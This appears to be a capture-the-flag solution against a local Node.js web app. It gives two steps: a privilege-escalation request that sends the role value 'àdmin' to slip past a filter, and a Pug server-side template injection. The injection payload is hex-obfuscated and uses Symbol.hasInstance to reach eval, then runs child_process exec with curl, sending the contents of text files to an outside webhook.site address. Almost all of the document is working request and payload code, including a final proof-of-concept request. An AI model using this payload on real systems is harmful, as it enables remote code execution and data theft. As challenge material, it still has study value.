1. Change the role from user to admin
```
POST /profile HTTP/1.1
Host: 127.0.0.1:21291
Content-Length: 11
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=xxxx

role=àdmin
```
2. SSTI in Pug JS using Symbol.hasInstance and then call eval function
```
#{x='global\x2ep\x72ocess\x2emainModule\x2econ\x73tructor\x2e_load\x28\x27child_p\x72ocess\x27\x29\x2ee\x78ec\x28"curl\x20https://webhook\x2esite/65986ea6-ac85-4460-a5b0-430301ccbd2f\x20-d\x60cat\x20/*\x2etxt\x60"\x29'}
#{x instanceof  {[Symbol['hasInstance']]:   globalThis['ev'+'al']	}	}
```
The final poc would be something like this:
```
POST /admin HTTP/1.1
Host: 127.0.0.1:21291
Cookie: connect.sid=xxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 306

name=%23{x='global\x2ep\x72ocess\x2emainModule\x2econ\x73tructor\x2e_load\x28\x27child_p\x72ocess\x27\x29\x2ee\x78ec\x28"curl\x20https://webhook\x2esite/65986ea6-ac85-4460-a5b0-430301ccbd2f\x20-d\x60cat\x20/*\x2etxt\x60"\x29'}%23{x%09instanceof%09{[Symbol['hasInstance']]:%09globalThis['ev'%2b'al']%09}%09}
```

Reference:
- https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses